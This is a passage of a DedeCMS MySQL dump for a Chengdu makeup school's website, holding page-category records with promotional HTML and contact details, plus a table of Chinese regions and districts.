群丽化妆学校培养出的近万名学员，已成为中国当今造型行业的主力军。为中国当代化妆艺术发展做出了贡献，取得了令人瞩目的成绩，赢得行业内外的高度评价。作为当代中国化妆师的标志性人物，成都群丽化妆大师成长为向大众传播化妆艺术的教育、引领民族化妆品行业风云的成功实业家。他以执著、激情和持续不断的创造力，带领群丽化妆学校抒写着一个又一个的传奇，把世界变得更佳美丽、绚烂！</span> <span style=\"font-size:20px;\"> 群丽化妆学校是西南地区首批大规模培训化妆，美甲人才的基地。学校投入雄厚的教学资金,引进先进的教学设备,凭借丰富的教学经验,邀请台湾资深形象设计师对课程进行合理设置,并聘请资深化妆造型师进行教学,为学员提供专业技术课程。</span> <span style=\"font-size:20px;\"> 在学习过程中,学校采用理论与实践相结合,注意实际运用的教学方式.并为每位学员提供优良的教学环境,让每位学员在丰富的理论中参与实践,从而提高专业的实质升华。</span> <span style=\"font-size:20px;\">群丽化妆学校已源源不断的为社会输出上万名化妆，美甲专业人才发展历程。 </span></span><br />\r\n	<br />\r\n	&nbsp;</div>\r\n<div style=\"text-align: center;\">\r\n	<br />\r\n	<span style=\"color:#cc6633;\"><span style=\"font-size:20px;\">&nbsp; &nbsp;</span></span> <img alt=\"\" src=\"/uploads/allimg/150520/1-1505201JTC62.jpg\" style=\"width: 543px; height: 122px;\" /></div>\r\n<div>\r\n	&nbsp;</div>\r\n<div style=\"text-align: center;\">\r\n	<span style=\"color:#336666;\"><span style=\"font-size:20px;\">&nbsp; 群丽婚纱摄影集团被授予&ldquo;中国婚纱十大杰出影楼&rdquo;的称号。　</span></span></div>\r\n<div style=\"text-align: center;\">\r\n	<span style=\"color:#336666;\"><span style=\"font-size:20px;\">&nbsp; 2003年配套引进最大专业婚纱礼服馆&ldquo;罗亚礼服馆&rdquo;</span></span></div>\r\n<div style=\"text-align: center;\">\r\n	<span style=\"color:#336666;\"><span style=\"font-size:20px;\">2004年2月&ldquo;群丽化妆摄影学校&rdquo;开业</span></span></div>\r\n<div style=\"text-align: center;\">\r\n	<span style=\"color:#336666;\"><span style=\"font-size:20px;\">2004年4月&ldquo;群丽绵阳店&rdquo;开业</span></span></div>\r\n<div style=\"text-align: center;\">\r\n	<span style=\"color:#336666;\"><span style=\"font-size:20px;\">2004年4月&ldquo;夏天工作室&rdquo;成立</span></span></div>\r\n<div style=\"text-align: center;\">\r\n	<span style=\"color:#336666;\"><span style=\"font-size:20px;\">2005年1月引进专业男士西服馆&ldquo;库马西服&rdquo;</span></span></div>\r\n<div style=\"text-align: center;\">\r\n	<span style=\"color:#336666;\"><span style=\"font-size:20px;\">2005年6月&ldquo;群丽南充店&rdquo;开业</span></span></div>\r\n<div style=\"text-align: center;\">\r\n	<span style=\"color:#336666;\"><span style=\"font-size:20px;\">2005年12月引进&ldquo;香觉SPA能量馆&rdquo;</span></span></div>\r\n<div style=\"text-align: center;\">\r\n	<span style=\"color:#336666;\"><span style=\"font-size:20px;\">2006年1月&ldquo;漾&rdquo;彩妆工作室开业</span></span></div>\r\n<div style=\"text-align: center;\">\r\n	<span style=\"color:#336666;\"><span style=\"font-size:20px;\">2007年，中华大家庭2008新人迎奥运活动，&ldquo;群丽婚纱&rdquo;为指定摄影单位</span></span></div>\r\n<div style=\"text-align: center;\">\r\n	<span style=\"font-size:20px;\"><span style=\"color:#ff0000;\">学校地址：<span style=\"text-align: center;\">成都市春熙路城守东大街6号蓝光大厦5楼（西南书城旁）&nbsp;</span></span></span></div>\r\n', '');
INSERT INTO dede_arctype VALUES ('10', '1', '1', '50', '学校环境', '/a/guanyuwomen/environment', '1', 'index.html', '1', '1', '-1', '1', '0', 'qunli/brandculture.htm', 'qunli/brandculture.htm', 'qunli/brandculture.htm', '{typedir}/{Y}/{M}{D}/{aid}.html', '{typedir}/list_{tid}_{page}.html', 'default', '', '', '', '0', '{cmspath}/a/guanyuwomen', '', '0', '0', '', '<div style=\"text-align: center;\">\r\n	<hr />\r\n	<p>\r\n		<br />\r\n		<img alt=\"\" src=\"/uploads/allimg/150522/1-1505221F4102W.jpg\" style=\"width: 700px; height: 1226px;\" /></p>\r\n</div>\r\n&nbsp;', '');
INSERT INTO dede_arctype VALUES ('11', '1', '1', '50', '资质荣誉', '/a/guanyuwomen/honor', '0', 'index.html', '1', '22', '-1', '0', '0', 'qunli/honor.htm', 'qunli/honor.htm', 'qunli/honor.htm', '{typedir}/{Y}/{M}{D}/{aid}.html', '{typedir}/list_{tid}_{page}.html', 'default', '', '', '', '0', '{cmspath}/a/guanyuwomen', '', '0', '0', '', '<div style=\"text-align: center;\">\r\n	&nbsp;<img alt=\"\" src=\"/uploads/allimg/150416/1-150416102514463.png\" style=\"width: 610px; height: 420px;\" /></div>\r\n', '');
INSERT INTO dede_arctype VALUES ('12', '2', '2', '50', '彩妆专业课程', '/a/zhuanyekecheng/caizhuang', '0', 'index.html', '1', '17', '-1', '0', '0', 'qunli/Classes.htm', 'qunli/Classes.htm', 'qunli/classIntro.htm', '{Y}/{M}{D}/{aid}.html', '{typedir}/list_{tid}_{page}.html', 'default', '', '', '', '0', '{cmspath}/a/zhuanyekecheng', '', '0', '0', '', '&nbsp;', '');
INSERT INTO dede_arctype VALUES ('13', '2', '2', '50', '美甲专业课程', '/a/zhuanyekecheng/meiron', '0', 'index.html', '1', '17', '-1', '0', '0', 'qunli/Classes.htm', 'qunli/Classes.htm', 'qunli/classIntro.htm', '{typedir}/{Y}/{M}{D}/{aid}.html', '{typedir}/list_{tid}_{page}.html', 'default', '', '', '', '0', '{cmspath}/a/zhuanyekecheng', '', '0', '0', '', '&nbsp;', '');
INSERT INTO dede_arctype VALUES ('14', '2', '2', '50', '美睫专业课程', '/a/zhuanyekecheng/meijia', '0', 'index.html', '1', '17', '-1', '0', '0', 'qunli/Classes.htm', 'qunli/Classes.htm', 'qunli/classIntro.htm', '{typedir}/{Y}/{M}{D}/{aid}.html', '{typedir}/list_{tid}_{page}.html', 'default', '', '', '', '0', '{cmspath}/a/zhuanyekecheng', '', '0', '0', '', '&nbsp;', '');
INSERT INTO dede_arctype VALUES ('15', '2', '2', '50', '自我化妆课程', '{cmspath}/a/zhuanyekecheng/zonghe', '0', 'index.html', '1', '17', '-1', '0', '0', 'qunli/Classes.htm', 'qunli/Classes.htm', 'qunli/classIntro.htm', '{typedir}/{Y}/{M}{D}/{aid}.html', '{typedir}/list_{tid}_{page}.html', 'default', '', '', '', '0', '{cmspath}/a/zhuanyekecheng', '', '0', '0', '', '&nbsp;', '');
INSERT INTO dede_arctype VALUES ('16', '3', '3', '50', '群丽动态', '/a/xinwendongtai/qunlidongtai', '0', 'index.html', '1', '1', '-1', '0', '0', 'qunli/news2.htm', 'qunli/news2.htm', 'qunli/news_artcle.htm', '{typedir}/{Y}/{M}{D}/{aid}.html', '{typedir}/list_{tid}_{page}.html', 'default', '', '', '', '0', '{cmspath}/a/xinwendongtai', '', '0', '0', '', '&nbsp;', '');
INSERT INTO dede_arctype VALUES ('17', '3', '3', '50', '群丽活动', '/a/xinwendongtai/qunliActive', '0', 'index.html', '1', '1', '-1', '0', '0', 'qunli/news2_hd.htm', 'qunli/news2_hd.htm', 'qunli/news_artcle.htm', '{typedir}/{Y}/{M}{D}/{aid}.html', '{typedir}/list_{tid}_{page}.html', 'default', '', '', '', '0', '{cmspath}/a/xinwendongtai', '', '0', '0', '', '&nbsp;', '');
INSERT INTO dede_arctype VALUES ('18', '3', '3', '50', '行业新闻', '/a/xinwendongtai/xingyexinwen/hangyenews', '0', 'index.html', '1', '1', '-1', '0', '0', 'qunli/news2.htm', 'qunli/news2.htm', 'qunli/news_artcle.htm', '{typedir}/{Y}/{M}{D}/{aid}.html', '{typedir}/list_{tid}_{page}.html', 'default', '', '', '', '0', '{cmspath}/a/xinwendongtai', '', '0', '0', '', '&nbsp;', '');
INSERT INTO dede_arctype VALUES ('19', '3', '3', '50', '视频中心', '/a/xinwendongtai/vedioCenter', '0', 'index.html', '1', '1', '-1', '0', '0', 'qunli/news2_hd_vo.htm', 'qunli/news2_hd_vo.htm', 'qunli/news_artcle.htm', '{typedir}/{Y}/{M}{D}/{aid}.html', '{typedir}/list_{tid}_{page}.html', 'default', '', '', '', '0', '{cmspath}/a/xinwendongtai', '', '1', '0', '', '&nbsp;', '');
INSERT INTO dede_arctype VALUES ('20', '4', '4', '50', '专业教师', '/a/xueyuanshizi/teachers', '0', 'index.html', '1', '18', '-1', '0', '0', 'qunli/Teachers.htm', 'qunli/Teachers.htm', 'qunli/personIntro.htm', '{Y}/{M}{D}/{aid}.html', '{typedir}/list_{tid}_{page}.html', 'default', '', '', '', '0', '', '', '0', '0', '', '&nbsp;', '');
INSERT INTO dede_arctype VALUES ('21', '4', '4', '50', '学员作品', '/a/xueyuanshizi/production', '0', 'index.html', '1', '20', '-1', '0', '0', 'qunli/Stu_works.htm', 'qunli/Stu_works.htm', 'qunli/Stu_works.htm', '{typedir}/{Y}/{M}{D}/{aid}.html', '{typedir}/list_{tid}_{page}.html', 'default', '', '', '', '0', '', '', '0', '0', '', '&nbsp;', '');
INSERT INTO dede_arctype VALUES ('22', '4', '4', '50', '优秀学员', '/a/xueyuanshizi/Students', '0', 'index.html', '1', '19', '-1', '0', '0', 'qunli/Students.htm', 'qunli/Students.htm', 'qunli/stuIntro.htm', '{typedir}/{Y}/{M}{D}/{aid}.html', '{typedir}/list_{tid}_{page}.html', 'default', '', '', '', '0', '', '', '0', '0', '', '&nbsp;', '');
INSERT INTO dede_arctype VALUES ('23', '5', '5', '50', '最新开班信息', '/a/zhaoshengjiuye/newClass', '1', 'index.html', '1', '21', '-1', '0', '0', 'qunli/newclass.htm', 'qunli/newclass.htm', 'qunli/newclass.htm', '{typedir}/{Y}/{M}{D}/{aid}.html', '{typedir}/list_{tid}_{page}.html', 'default', '', '', '', '0', '', '', '0', '0', '', '&nbsp;', '');
INSERT INTO dede_arctype VALUES ('24', '5', '5', '50', '报名须知', '/a/zhaoshengjiuye#askQuestion', '1', 'index.html', '1', '1', '-1', '2', '0', 'qunli/recruitStudent.htm', 'qunli/recruitStudent.htm', 'qunli/recruitStudent.htm', '{typedir}/{Y}/{M}{D}/{aid}.html', '{typedir}/list_{tid}_{page}.html', 'default', '', '', '', '0', '', '', '0', '0', '', '&nbsp;', '');
INSERT INTO dede_arctype VALUES ('25', '5', '5', '50', '就业保障', '/a/zhaoshengjiuye/jiuyebaozhang', '1', 'index.html', '1', '1', '-1', '1', '0', 'qunli/employment.htm', 'qunli/employment.htm', 'qunli/employment.htm', '{typedir}/{Y}/{M}{D}/{aid}.html', '{typedir}/list_{tid}_{page}.html', 'default', '', '', '', '0', '', '', '0', '0', '', '&nbsp;', '');
INSERT INTO dede_arctype VALUES ('26', '6', '6', '50', '婚礼跟妆', '/a/shangwuhezuo/schoolIntro', '1', 'index.html', '1', '1', '-1', '1', '0', 'qunli/business_jump_Cooperation.htm', 'qunli/business_jump_Cooperation.htm', 'qunli/businessCooperation.htm', '{typedir}/{Y}/{M}{D}/{aid}.html', '{typedir}/list_{tid}_{page}.html', 'default', '', '', '', '0', '{cmspath}/a/shangwuhezuo', '', '0', '0', '', '&nbsp;', '');
INSERT INTO dede_arctype VALUES ('27', '6', '6', '50', '企业化妆培训', '/a/shangwuhezuo/schoolIntro', '1', 'index.html', '1', '1', '-1', '1', '0', 'qunli/business_jump_Cooperation.htm', 'qunli/business_jump_Cooperation.htm', 'qunli/businessCooperation.htm', '{typedir}/{Y}/{M}{D}/{aid}.html', '{typedir}/list_{tid}_{page}.html', 'default', '', '', '', '0', '{cmspath}/a/shangwuhezuo', '', '0', '0', '', '&nbsp;', '');
INSERT INTO dede_arctype VALUES ('28', '6', '6', '50', '大型活动跟妆', '/a/shangwuhezuo/schoolIntro', '1', 'index.html', '1', '1', '-1', '1', '0', 'qunli/business_jump_Cooperation.htm', 'qunli/business_jump_Cooperation.htm', 'qunli/businessCooperation.htm', '{typedir}/{Y}/{M}{D}/{aid}.html', '{typedir}/list_{tid}_{page}.html', 'default', '', '', '', '0', '{cmspath}/a/shangwuhezuo', '', '0', '0', '', '&nbsp;', '');
INSERT INTO dede_arctype VALUES ('29', '6', '6', '50', '其他商务合作', '/a/shangwuhezuo/otherBc', '1', 'index.html', '1', '1', '-1', '1', '0', 'qunli/business_other_Cooperation.htm', 'qunli/business_other_Cooperation.htm', 'qunli/businessCooperation.htm', '{typedir}/{Y}/{M}{D}/{aid}.html', '{typedir}/list_{tid}_{page}.html', 'default', '', '', '', '0', '{cmspath}/a/shangwuhezuo', '', '0', '0', '', '&nbsp;', '');
INSERT INTO dede_arctype VALUES ('30', '7', '7', '50', '联系我们', '/a/lianxiwomen', '1', 'index.html', '1', '1', '-1', '1', '0', 'qunli/contactUs_num.htm', 'qunli/contactUs.htm', 'qunli/contactUs.htm', '{typedir}/{Y}/{M}{D}/{aid}.html', '{typedir}/list_{tid}_{page}.html', 'default', '', '', '', '0', '{cmspath}/a/lianxiwomen', '', '0', '0', '', '&nbsp;<span style=\"font-family: 微软雅黑, \'microsoft yahei\'; font-size: 16px; color: rgb(51, 51, 51); line-height: 30px; text-indent: 28px; widows: 1;\">名称：群丽化妆摄影学校</span>\r\n<div id=\"mapCard_address\" style=\"margin: 0px; padding: 0px; border: none; color: rgb(51, 51, 51); line-height: 30px; text-indent: 28px; widows: 1; width: 595px;\">\r\n	地址：四川省成都市锦江区锦江区城守东大街59号蓝光大厦5楼</div>\r\n<div id=\"mapCard_phone\" style=\"margin: 0px; padding: 0px; border: none; color: rgb(51, 51, 51); line-height: 30px; text-indent: 28px; widows: 1; width: 595px;\">\r\n	电话：028-86661825 &nbsp; &nbsp; &nbsp; &nbsp;<span style=\"color: rgb(65, 49, 58); font-family: 微软雅黑; font-size: 14px; font-weight: 900; line-height: 24px; text-align: center;\">QQ：</span><span style=\"color: rgb(65, 49, 58); font-family: 微软雅黑; font-size: 14px; font-weight: 900; line-height: 24px; text-align: center;\">610606820</span></div>\r\n<div id=\"mapCard_fax\" style=\"margin: 0px; padding: 0px; border: none; color: rgb(51, 51, 51); line-height: 30px; text-indent: 28px; widows: 1; width: 595px;\">\r\n	电话：028-86661640 &nbsp; &nbsp; &nbsp; &nbsp;</div>\r\n<div id=\"mapCard_email\" style=\"margin: 0px; padding: 0px; border: none; color: rgb(51, 51, 51); line-height: 30px; text-indent: 28px; widows: 1; width: 595px;\">\r\n	email：skyzp@126.com<br />\r\n	<img alt=\"\" src=\"/uploads/allimg/150415/1-150415132555436.jpg\" style=\"width: 690px; height: 779px;\" /></div>\r\n', '');
INSERT INTO dede_arctype VALUES ('31', '7', '7', '50', '地图位置', '/a/lianxiwomen#position', '1', 'index.html', '1', '1', '-1', '1', '0', 'qunli/contactUs_map.htm', 'qunli/contactUs.htm', 'qunli/contactUs.htm', '{typedir}/{Y}/{M}{D}/{aid}.html', '{typedir}/list_{tid}_{page}.html', 'default', '', '', '', '0', '{cmspath}/a/lianxiwomen', '', '0', '0', '', '&nbsp;', '');
INSERT INTO dede_arctype VALUES ('32', '3', '3', '50', '所有新闻', '/a/xinwendongtai/suoyouxinwen', '1', 'index.html', '1', '1', '-1', '0', '0', 'qunli/newDetails.htm', 'qunli/newDetails.htm', 'qunli/news_artcle.htm', '{typedir}/{Y}/{M}{D}/{aid}.html', '{typedir}/list_{tid}_{page}.html', 'default', '', '', '', '0', '{cmspath}/a/xinwendongtai', '', '1', '0', '', '&nbsp;', '');
INSERT INTO dede_arctype VALUES ('33', '20', '4', '50', '彩妆专业教师', '/a/xueyuanshizi/schoolIntro/caizhuangzhuanyejiaoshi', '0', 'index.html', '1', '18', '-1', '0', '0', 'qunli/Teachers.htm', 'qunli/Teachers.htm', 'qunli/personIntro.htm', '{typedir}/{Y}/{M}{D}/{aid}.html', '{typedir}/list_{tid}_{page}.html', 'default', '', '', '', '0', '', '', '0', '0', '', '&nbsp;', '');
INSERT INTO dede_arctype VALUES ('34', '20', '4', '50', '美容专业教师', '/a/xueyuanshizi/schoolIntro/meirongzhuanyejiaoshi', '0', 'index.html', '1', '18', '-1', '0', '0', 'qunli/Teachers.htm', 'qunli/Teachers.htm', 'qunli/personIntro.htm', '{typedir}/{Y}/{M}{D}/{aid}.html', '{typedir}/list_{tid}_{page}.html', 'default', '', '', '', '0', '', '', '0', '0', '', '&nbsp;', '');
INSERT INTO dede_arctype VALUES ('35', '20', '4', '50', '美甲专业教师', '/a/xueyuanshizi/schoolIntro/meijiazhuanyejiaoshi', '0', 'index.html', '1', '18', '-1', '0', '0', 'qunli/Teachers.htm', 'qunli/Teachers.htm', 'qunli/personIntro.htm', '{typedir}/{Y}/{M}{D}/{aid}.html', '{typedir}/list_{tid}_{page}.html', 'default', '', '', '', '0', '', '', '0', '0', '', '&nbsp;', '');
INSERT INTO dede_arctype VALUES ('36', '20', '4', '50', '综合专业教师', '/a/xueyuanshizi/schoolIntro/zonghezhuanyejiaoshi', '0', 'index.html', '1', '18', '-1', '0', '0', 'qunli/Teachers.htm', 'qunli/Teachers.htm', 'qunli/personIntro.htm', '{typedir}/{Y}/{M}{D}/{aid}.html', '{typedir}/list_{tid}_{page}.html', 'default', '', '', '', '0', '', '', '0', '0', '', '&nbsp;', '');
INSERT INTO dede_arctype VALUES ('37', '25', '5', '50', '群丽优势', '/a/zhaoshengjiuye/jiuyebaozhang/qunliyoushi', '1', 'index.html', '1', '1', '-1', '0', '0', 'qunli/advantage.htm', 'qunli/advantage.htm', 'qunli/advantage.htm', '{typedir}/{Y}/{M}{D}/{aid}.html', '{typedir}/list_{tid}_{page}.html', 'default', '', '', '', '0', '', '', '0', '0', '', '&nbsp;', '');
INSERT INTO dede_arctype VALUES ('38', '25', '5', '50', '合作伙伴', '/a/zhaoshengjiuye/jiuyebaozhang/hezuohuoban', '1', 'index.html', '1', '1', '-1', '0', '0', 'qunli/partner.htm', 'qunli/partner.htm', 'qunli/partner.htm', '{typedir}/{Y}/{M}{D}/{aid}.html', '{typedir}/list_{tid}_{page}.html', 'default', '', '', '', '0', '', '', '0', '0', '', '&nbsp;', '');
INSERT INTO dede_arctype VALUES ('39', '25', '5', '50', '签约企业', '/a/zhaoshengjiuye/jiuyebaozhang/qianyueqiye', '1', 'index.html', '1', '1', '-1', '0', '0', 'qunli/Signed.htm', 'qunli/Signed.htm', 'qunli/Signed.htm', '{typedir}/{Y}/{M}{D}/{aid}.html', '{typedir}/list_{tid}_{page}.html', 'default', '', '', '', '0', '', '', '0', '0', '', '&nbsp;', '');
INSERT INTO dede_arctype VALUES ('40', '25', '5', '50', '推荐职位', '/a/zhaoshengjiuye/jiuyebaozhang/tuijianzhiwei', '0', 'index.html', '1', '1', '-1', '0', '0', 'qunli/job.htm', 'qunli/job.htm', 'qunli/news_artcle.htm', '{typedir}/{Y}/{M}{D}/{aid}.html', '{typedir}/list_{tid}_{page}.html', 'default', '', '', '', '0', '', '', '0', '0', '', '&nbsp;', '');
INSERT INTO dede_arctype VALUES ('41', '0', '0', '51', '群丽化妆学校', '{cmspath}/a/zhuantiye', '0', 'index.html', '1', '1', '-1', '0', '0', 'qunli/zhuanti.htm', 'qunli/zhuanti.htm', 'qunli/zhuanti.htm', '{typedir}/{Y}/{M}{D}/{aid}.html', '{typedir}/list_{tid}_{page}.html', 'default', '', '', '', '0', '{cmspath}/a/zhuantiye', '', '1', '0', '', '&nbsp;', '');

-- ----------------------------
-- Table structure for `dede_area`
-- ----------------------------
DROP TABLE IF EXISTS `dede_area`;
CREATE TABLE `dede_area` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(20) NOT NULL DEFAULT '',
  `reid` int(10) unsigned NOT NULL DEFAULT '0',
  `disorder` int(10) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=3118 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of dede_area
-- ----------------------------
INSERT INTO dede_area VALUES ('1', '北京市', '0', '0');
INSERT INTO dede_area VALUES ('102', '西城区', '1', '2');
INSERT INTO dede_area VALUES ('126', '崇文区', '1', '0');
INSERT INTO dede_area VALUES ('104', '宣武区', '1', '0');
INSERT INTO dede_area VALUES ('105', '朝阳区', '1', '0');
INSERT INTO dede_area VALUES ('106', '海淀区', '1', '0');
INSERT INTO dede_area VALUES ('107', '丰台区', '1', '0');
INSERT INTO dede_area VALUES ('108', '石景山区', '1', '0');
INSERT INTO dede_area VALUES ('109', '门头沟区', '1', '0');
INSERT INTO dede_area VALUES ('110', '房山区', '1', '0');
INSERT INTO dede_area VALUES ('111', '通州区', '1', '0');
INSERT INTO dede_area VALUES ('112', '顺义区', '1', '0');
INSERT INTO dede_area VALUES ('113', '昌平区', '1', '0');
INSERT INTO dede_area VALUES ('114', '大兴区', '1', '0');
INSERT INTO dede_area VALUES ('115', '平谷县', '1', '0');
INSERT INTO dede_area VALUES ('116', '怀柔县', '1', '0');
INSERT INTO dede_area VALUES ('117', '密云县', '1', '0');
INSERT INTO dede_area VALUES ('118', '延庆县', '1', '0');
INSERT INTO dede_area VALUES ('2', '上海市', '0', '0');
INSERT INTO dede_area VALUES ('201', '黄浦区', '2', '0');
INSERT INTO dede_area VALUES ('202', '卢湾区', '2', '0');
INSERT INTO dede_area VALUES ('203', '徐汇区', '2', '0');
INSERT INTO dede_area VALUES ('204', '长宁区', '2', '0');
INSERT INTO dede_area VALUES ('205', '静安区', '2', '0');
INSERT INTO dede_area VALUES ('206', '普陀区', '2', '0');
INSERT INTO dede_area VALUES ('207', '闸北区', '2', '0');
INSERT INTO dede_area VALUES ('208', '虹口区', '2', '0');
INSERT INTO dede_area VALUES ('209', '杨浦区', '2', '0');
INSERT INTO dede_area VALUES ('210', '宝山区', '2', '0');
INSERT INTO dede_area VALUES ('211', '闵行区', '2', '0');
INSERT INTO dede_area VALUES ('212', '嘉定区', '2', '0');
INSERT INTO dede_area VALUES ('213', '浦东新区', '2', '0');
INSERT INTO dede_area VALUES ('214', '松江区', '2', '0');
INSERT INTO dede_area VALUES ('215', '金山区', '2', '0');
INSERT INTO dede_area VALUES ('216', '青浦区', '2', '0');
INSERT INTO dede_area VALUES ('217', '南汇区', '2', '0');
INSERT INTO dede_area VALUES ('218', '奉贤区', '2', '0');
INSERT INTO dede_area VALUES ('219', '崇明县', '2', '0');
INSERT INTO dede_area VALUES ('3', '天津市', '0', '0');
INSERT INTO dede_area VALUES ('301', '和平区', '3', '0');
INSERT INTO dede_area VALUES ('302', '河东区', '3', '0');
INSERT INTO dede_area VALUES ('303', '河西区', '3', '0');
INSERT INTO dede_area VALUES ('304', '南开区', '3', '0');
INSERT INTO dede_area VALUES ('305', '河北区', '3', '0');
INSERT INTO dede_area VALUES ('306', '红桥区', '3', '0');
INSERT INTO dede_area VALUES ('307', '塘沽区', '3', '0');
INSERT INTO dede_area VALUES ('308', '汉沽区', '3', '0');
INSERT INTO dede_area VALUES ('309', '大港区', '3', '0');
INSERT INTO dede_area VALUES ('310', '东丽区', '3', '0');
INSERT INTO dede_area VALUES ('311', '西青区', '3', '0');
INSERT INTO dede_area VALUES ('312', '北辰区', '3', '0');
INSERT INTO dede_area VALUES ('313', '津南区', '3', '0');
INSERT INTO dede_area VALUES ('314', '武清区', '3', '0');
INSERT INTO dede_area VALUES ('315', '宝坻区', '3', '0');
INSERT INTO dede_area VALUES ('316', '静海县', '3', '0');
INSERT INTO dede_area VALUES ('317', '宁河县', '3', '0');
INSERT INTO dede_area VALUES ('318', '蓟县', '3', '0');
INSERT INTO dede_area VALUES ('4', '重庆市', '0', '0');
INSERT INTO dede_area VALUES ('401', '渝中区', '4', '0');
INSERT INTO dede_area VALUES ('402', '大渡口区', '4', '0');
INSERT INTO dede_area VALUES ('403', '江北区', '4', '0');
INSERT INTO dede_area VALUES ('404', '沙坪坝区', '4', '0');
INSERT INTO dede_area VALUES ('405', '九龙坡区', '4', '0');
INSERT INTO dede_area VALUES ('406', '南岸区', '4', '0');
INSERT INTO dede_area VALUES ('407', '北碚区', '4', '0');
INSERT INTO dede_area VALUES ('408', '万盛区', '4', '0');
INSERT INTO dede_area VALUES ('409', '双桥区', '4', '0');
INSERT INTO dede_area VALUES ('410', '渝北区', '4', '0');
INSERT INTO dede_area VALUES ('411', '巴南区', '4', '0');
INSERT INTO dede_area VALUES ('412', '万州区', '4', '0');
INSERT INTO dede_area VALUES ('413', '涪陵区', '4', '0');
INSERT INTO dede_area VALUES ('414', '黔江区', '4', '0');
INSERT INTO dede_area VALUES ('415', '永川市', '4', '0');
INSERT INTO dede_area VALUES ('416', '合川市', '4', '0');
INSERT INTO dede_area VALUES ('417', '江津市', '4', '0');
INSERT INTO dede_area VALUES ('418', '南川市', '4', '0');
INSERT INTO dede_area VALUES ('419', '长寿县', '4', '0');
INSERT INTO dede_area VALUES ('420', '綦江县', '4', '0');
INSERT INTO dede_area VALUES ('421', '潼南县', '4', '0');
INSERT INTO dede_area VALUES ('422', '荣昌县', '4', '0');
INSERT INTO dede_area VALUES ('423', '璧山县', '4', '0');
INSERT INTO dede_area VALUES ('424', '大足县', '4', '0');
INSERT INTO dede_area VALUES ('425', '铜梁县', '4', '0');
INSERT INTO dede_area VALUES ('426', '梁平县', '4', '0');
INSERT INTO dede_area VALUES ('427', '城口县', '4', '0');
INSERT INTO dede_area VALUES ('428', '垫江县', '4', '0');
INSERT INTO dede_area VALUES ('429', '武隆县', '4', '0');
INSERT INTO dede_area VALUES ('430', '丰都县', '4', '0');
INSERT INTO dede_area VALUES ('431', '奉节县', '4', '0');
INSERT INTO dede_area VALUES ('432', '开县', '4', '0');
INSERT INTO dede_area VALUES ('433', '云阳县', '4', '0');
INSERT INTO dede_area VALUES ('434', '忠县', '4', '0');
INSERT INTO dede_area VALUES ('435', '巫溪县', '4', '0');
INSERT INTO dede_area VALUES ('436', '巫山县', '4', '0');
INSERT INTO dede_area VALUES ('437', '石柱县', '4', '0');
INSERT INTO dede_area VALUES ('438', '秀山县', '4', '0');
INSERT INTO dede_area VALUES ('439', '酉阳县', '4', '0');
INSERT INTO dede_area VALUES ('440', '彭水县', '4', '0');
INSERT INTO dede_area VALUES ('5', '广东省', '0', '0');
INSERT INTO dede_area VALUES ('501', '广州市', '5', '0');
INSERT INTO dede_area VALUES ('502', '深圳市', '5', '0');
INSERT INTO dede_area VALUES ('503', '珠海市', '5', '0');
INSERT INTO dede_area VALUES ('504', '汕头市', '5', '0');
INSERT INTO dede_area VALUES ('505', '韶关市', '5', '0');
INSERT INTO dede_area VALUES ('506', '河源市', '5', '0');
INSERT INTO dede_area VALUES ('507', '梅州市', '5', '0');
INSERT INTO dede_area VALUES ('508', '惠州市', '5', '0');
INSERT INTO dede_area VALUES ('509', '汕尾市', '5', '0');
INSERT INTO dede_area VALUES ('510', '东莞市', '5', '0');
INSERT INTO dede_area VALUES ('511', '中山市', '5', '0');
INSERT INTO dede_area VALUES ('512', '江门市', '5', '0');
INSERT INTO dede_area VALUES ('513', '佛山市', '5', '0');
INSERT INTO dede_area VALUES ('514', '阳江市', '5', '0');
INSERT INTO dede_area VALUES ('515', '湛江市', '5', '0');
INSERT INTO dede_area VALUES ('516', '茂名市', '5', '0');
INSERT INTO dede_area VALUES ('517', '肇庆市', '5', '0');
INSERT INTO dede_area VALUES ('518', '清远市', '5', '0');
INSERT INTO dede_area VALUES ('519', '潮州市', '5', '0');
INSERT INTO dede_area VALUES ('520', '揭阳市', '5', '0');
INSERT INTO dede_area VALUES ('521', '云浮市', '5', '0');
INSERT INTO dede_area VALUES ('6', '福建省', '0', '0');
INSERT INTO dede_area VALUES ('601', '福州市', '6', '0');
INSERT INTO dede_area VALUES ('602', '厦门市', '6', '0');
INSERT INTO dede_area VALUES ('603', '三明市', '6', '0');
INSERT INTO dede_area VALUES ('604', '莆田市', '6', '0');
INSERT INTO dede_area VALUES ('605', '泉州市', '6', '0');
INSERT INTO dede_area VALUES ('606', '漳州市', '6', '0');
INSERT INTO dede_area VALUES ('607', '南平市', '6', '0');
INSERT INTO dede_area VALUES ('608', '龙岩市', '6', '0');
INSERT INTO dede_area VALUES ('609', '宁德市', '6', '0');
INSERT INTO dede_area VALUES ('7', '浙江省', '0', '0');
INSERT INTO dede_area VALUES ('701', '杭州市', '7', '0');
INSERT INTO dede_area VALUES ('702', '宁波市', '7', '0');
INSERT INTO dede_area VALUES ('703', '温州市', '7', '0');
INSERT INTO dede_area VALUES ('704', '嘉兴市', '7', '0');
INSERT INTO dede_area VALUES ('705', '湖州市', '7', '0');
INSERT INTO dede_area VALUES ('706', '绍兴市', '7', '0');
INSERT INTO dede_area VALUES ('707', '金华市', '7', '0');
INSERT INTO dede_area VALUES ('708', '衢州市', '7', '0');
INSERT INTO dede_area VALUES ('709', '舟山市', '7', '0');
INSERT INTO dede_area VALUES ('710', '台州市', '7', '0');
INSERT INTO dede_area VALUES ('711', '丽水市', '7', '0');
INSERT INTO dede_area VALUES ('8', '江苏省', '0', '0');
INSERT INTO dede_area VALUES ('801', '南京市', '8', '0');
INSERT INTO dede_area VALUES ('802', '徐州市', '8', '0');
INSERT INTO dede_area VALUES ('803', '连云港市', '8', '0');
INSERT INTO dede_area VALUES ('804', '淮安市', '8', '0');
INSERT INTO dede_area VALUES ('805', '宿迁市', '8', '0');
INSERT INTO dede_area VALUES ('806', '盐城市', '8', '0');
INSERT INTO dede_area VALUES ('807', '扬州市', '8', '0');
INSERT INTO dede_area VALUES ('808', '泰州市', '8', '0');
INSERT INTO dede_area VALUES ('809', '南通市', '8', '0');
INSERT INTO dede_area VALUES ('810', '镇江市', '8', '0');
INSERT INTO dede_area VALUES ('811', '常州市', '8', '0');
INSERT INTO dede_area VALUES ('812', '无锡市', '8', '0');
